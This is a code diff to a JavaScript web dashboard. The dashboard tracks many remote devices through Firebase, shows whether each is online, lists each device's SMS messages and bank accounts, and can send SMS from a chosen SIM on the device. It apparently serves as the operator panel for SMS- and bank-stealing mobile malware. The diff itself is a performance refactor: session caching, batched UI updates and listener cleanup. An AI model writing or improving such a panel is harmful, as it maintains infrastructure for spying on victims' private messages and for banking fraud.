@@ -971,6 +971,11 @@ var ONLINE_FLAG_TRUST_MS=300000;
 var ONLINE_PULSE_MS=3000;
 var ONLINE_TICK_MS=3000;
 var _onlineTickTimer=0;
+var _activeDataTab='sms';
+var _deviceSessionCache={};
+var _simCache={};
+var _pulseBatchTimer=0;
+var _pulseDirty=false;
 var fetchStartMs=0, firstFetchDone=false;
 var activeFbId='';
 var ACTIVE_FB_KEY='rbl_active_fb';
@@ -1318,8 +1323,78 @@ function resolveOnlineStatus(s,fbId){
   if(hb&&hbAge<=ONLINE_STALE_MS) return true;
   return false;
 }
+function schedulePulseUi(){
+  _pulseDirty=true;
+  if(_pulseBatchTimer) return;
+  _pulseBatchTimer=setTimeout(function(){
+    _pulseBatchTimer=0;
+    if(_pulseDirty){_pulseDirty=false;scheduleProcessClientsUI(false);}
+  },400);
+}
+function highlightSelectedDev(){
+  var items=document.querySelectorAll('.dev-item');
+  if(!items.length) return;
+  var list=window._sidebarList||[];
+  for(var i=0;i<list.length;i++){
+    if(items[i]){
+      if(list[i].id===selDev) items[i].classList.add('active');
+      else items[i].classList.remove('active');
+    }
+  }
+}
+function saveDeviceSession(devId){
+  if(!devId) return;
+  _deviceSessionCache[devId]={
+    allSms:(window._allSmsData||[]).slice(0,120),
+    newSms:(window._newSmsData||[]).slice(0,60),
+    allSmsTotal:window._allSmsTotal||0,
+    rabelKeys:Object.assign({},window._rabelSmsSeenKeys||{}),
+    rabelHydrated:!!window._rabelSmsHydrated,
+    smsHash:_smsListHash,
+    bankHash:_bankDataHash,
+    tabLoaded:Object.assign({},tabLoaded),
+    smsData:(window._smsData||[]).slice(0,120)
+  };
+  if(!window._cacheOrder) window._cacheOrder=[];
+  var i=window._cacheOrder.indexOf(devId);
+  if(i>=0) window._cacheOrder.splice(i,1);
+  window._cacheOrder.push(devId);
+  while(window._cacheOrder.length>10){
+    var old=window._cacheOrder.shift();
+    delete _deviceSessionCache[old];
+    delete _simCache[old];
+  }
+}
+function restoreDeviceSession(devId){
+  var c=_deviceSessionCache[devId];
+  if(!c) return false;
+  window._allSmsData=c.allSms||[];
+  window._newSmsData=c.newSms||[];
+  window._allSmsTotal=c.allSmsTotal||0;
+  window._rabelSmsSeenKeys=Object.assign({},c.rabelKeys||{});
+  window._rabelSmsHydrated=!!c.rabelHydrated;
+  window._smsData=c.smsData||[];
+  _smsListHash=c.smsHash||'';
+  _bankDataHash=c.bankHash||'';
+  tabLoaded=Object.assign({},c.tabLoaded||{});
+  return true;
+}
+function clearDeviceListenersForDev(dev){
+  if(!dev) return;
+  var rid=dev.rawId, fb=dev.fbId;
+  Object.keys(activeListeners).forEach(function(k){
+    if(k.indexOf(rid)<0&&k.indexOf(fb+'::')<0) return;
+    var L=activeListeners[k];
+    if(L&&L.type==='rest'&&L.timer) clearInterval(L.timer);
+    else if(L&&L.type==='children'&&L.db){
+      L.db.ref(L.path).off('child_added',L.addH);
+      if(L.chH) L.db.ref(L.path).off('child_changed',L.chH);
+    }else if(L&&L.db&&L.handler) L.db.ref(L.path).off('value',L.handler);
+    delete activeListeners[k];
+  });
+}
 function getOnlinePulseMs(inst){
-  return inst&&inst.schema==='rabel'?3000:ONLINE_PULSE_MS;
+  return inst&&inst.schema==='rabel'?8000:12000;
 }
 function parseJoinedDate(str){
   if(!str) return 0;
@@ -1691,15 +1766,16 @@ function attachRestPolling(inst){
 }
 function attachOnlineStatusPulse(inst){
   if(inst.onlinePulseTimer) return;
-  var nodes=['clients','devices','devices_status'];
+  var nodes=['clients','devices'];
   function pulse(){
     nodes.forEach(function(node){
       restJson(inst.restUrl+'/'+node+'.json?shallow=true').then(function(ids){
         if(!ids||typeof ids!=='object') return;
+        var touched=false;
         Object.keys(ids).forEach(function(id){
           if(typeof ids[id]==='object'&&ids[id]!==null&&!Array.isArray(ids[id])){
             ingestDeviceData(inst.id,node,id,ids[id]);
-            applyFbData(inst);
+            touched=true;
             return;
           }
           var key=makeDevKey(inst.id,id);
@@ -1709,7 +1785,7 @@ function attachOnlineStatusPulse(inst){
             clientsRawMap[key]=Object.assign({},prev,{online_status:st,online:st===true,_node:node,_fbId:inst.id});
             if(st===true) clientsRawMap[key]._lastOnlineMs=Date.now();
             clientsRawMap[key]._computedOnline=resolveOnlineStatus(clientsRawMap[key],inst.id);
-            applyFbData(inst);
+            schedulePulseUi();
           });
           restJson(base+'live_data.json').then(function(live){
             if(!live||typeof live!=='object') return;
@@ -1722,9 +1798,10 @@ function attachOnlineStatusPulse(inst){
             if(ts) patch.ts=ts;
             if(resolveOnlineStatus(patch,inst.id)) patch._lastOnlineMs=Date.now();
             clientsRawMap[key]=patch;
-            applyFbData(inst);
+            schedulePulseUi();
           });
         });
+        if(touched) schedulePulseUi();
       });
     });
   }
@@ -1735,7 +1812,7 @@ function startOnlineAccuracyTicker(){
   if(_onlineTickTimer) return;
   _onlineTickTimer=setInterval(function(){
     if(!panelInitialized||!Object.keys(clientsRawMap).length) return;
-    var changed=false,now=Date.now();
+    var changed=false;
     Object.keys(clientsRawMap).forEach(function(key){
       var s=clientsRawMap[key];
       if(!s) return;
@@ -1748,12 +1825,12 @@ function startOnlineAccuracyTicker(){
       }
       if(was!==on) changed=true;
     });
-    if(changed) processClientsData(getFbDataMap(),false);
+    if(changed) scheduleProcessClientsUI(false);
     else if(selDev){
       var dev=allDevs.find(function(d){return d.id===selDev;});
       if(dev) renderLastSeen(dev);
     }
-  },ONLINE_TICK_MS);
+  },5000);
 }
 function fetchAllFirebaseData(){
   if(!firebaseInstances.length){initAllFirebase();}
@@ -1979,26 +2056,41 @@ function updateStats(){
 
 // ═══ OPEN DEVICE ═══
 function openDevice(id){
-  if(selDev===id&&tabLoaded.sms){
-    var dev=allDevs.find(function(d){return d.id===id;});
-    if(dev) updateHero(dev);
+  if(selDev===id){
+    var devNow=allDevs.find(function(d){return d.id===id;});
+    if(devNow) updateHero(devNow);
+    highlightSelectedDev();
     return;
   }
-  selDev=id; renderSidebar();
+  var prevDev=getSelDev();
+  if(selDev) saveDeviceSession(selDev);
+  if(prevDev) clearDeviceListenersForDev(prevDev);
+  selDev=id;
+  highlightSelectedDev();
   document.getElementById('emptyState').classList.add('hidden');
   document.getElementById('deviceDetail').classList.remove('hidden');
   var dev=allDevs.find(function(d){return d.id===id;});
   if(dev) updateHero(dev);
-  clearDeviceListeners();
-  tabLoaded={};
-  window._allSmsData=[]; window._newSmsData=[]; window._allSmsTotal=0;
-  window._rabelSmsSeenKeys={};
-  window._rabelSmsHydrated=false;
-  _smsListHash='';
-  _bankDataHash='';
-  renderSmsList();
-  if(dev) loadSendSimOptions(dev);
-  ensureTabLoaded('sms');
+  var restored=restoreDeviceSession(id);
+  if(!restored){
+    tabLoaded={};
+    window._allSmsData=[]; window._newSmsData=[]; window._allSmsTotal=0;
+    window._rabelSmsSeenKeys={};
+    window._rabelSmsHydrated=false;
+    _smsListHash='';
+    _bankDataHash='';
+    renderSmsList();
+  }else{
+    renderSmsList();
+    if(_activeDataTab==='bank') renderBankAccounts();
+  }
+  requestAnimationFrame(function(){
+    if(!dev) return;
+    if(_simCache[id]) renderSendSimPicker(_simCache[id]);
+    else loadSendSimOptions(dev);
+    if(!tabLoaded[_activeDataTab]) ensureTabLoaded(_activeDataTab);
+    else if(_activeDataTab==='sms'&&!window._allSmsData.length) ensureTabLoaded('sms');
+  });
 }
 
 function updateHero(d){
@@ -2331,6 +2423,7 @@ function ensureTabLoaded(tab){
 
 // ═══ DATA TABS ═══
 function switchDataTab(name,btn){
+  _activeDataTab=name;
   document.querySelectorAll('.data-tab').forEach(function(b){b.classList.remove('active');});
   btn.classList.add('active');
   document.querySelectorAll('.data-section').forEach(function(s){s.classList.remove('active');});
@@ -2407,6 +2500,7 @@ function renderSendSimPicker(slots){
   var el=document.getElementById('sendSimPicker');
   if(!el)return;
   _deviceSims=slots&&slots.length?slots:defaultSimSlots();
+  if(selDev)_simCache[selDev]=_deviceSims.slice();
   if(!_deviceSims.some(function(s){return s.slot===_sendSimSlot;}))_sendSimSlot=_deviceSims[0].slot;
   el.innerHTML=_deviceSims.map(function(sim){
     var active=sim.slot===_sendSimSlot?' active':'';
@@ -2821,7 +2915,7 @@ function renderSmsList(){
       '<td class="mono" style="color:var(--muted)">'+esc(s.date_readable||'—')+'</td>'+
       '<td><span class="sbadge '+type+'">'+esc(s.type||'?')+'</span></td></tr>';
   }).join('');
-  renderBankAccounts();
+  if(_activeDataTab==='bank') renderBankAccounts();
 }
 
 function openSmsModal(idx){
